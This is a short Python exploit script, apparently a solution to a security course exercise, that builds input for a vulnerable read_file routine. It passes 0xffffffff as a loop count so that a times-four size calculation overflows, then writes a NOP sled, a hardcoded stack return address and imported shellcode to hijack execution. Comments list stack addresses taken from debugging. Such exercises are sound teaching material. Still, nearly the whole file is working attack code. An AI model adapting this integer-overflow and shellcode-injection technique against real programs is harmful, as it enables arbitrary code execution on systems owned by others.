#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# alloca instruction: 0x8048956
# esp: 0xfffe9fc0 (before alloca)
# ebp of read_file: 0xfffe9fcc
# esp: 0xfffe9fb4 (after alloca)
# buf: ebp-12 (after alloca)

sys.stdout.buffer.write(pack('<I', 0xffffffff)) # loop 0xffffffff times but 0xffffffff*4 overflows
sys.stdout.buffer.write(b'\x90'*16 + pack('<I', 0xfffe9fd4) + shellcode)
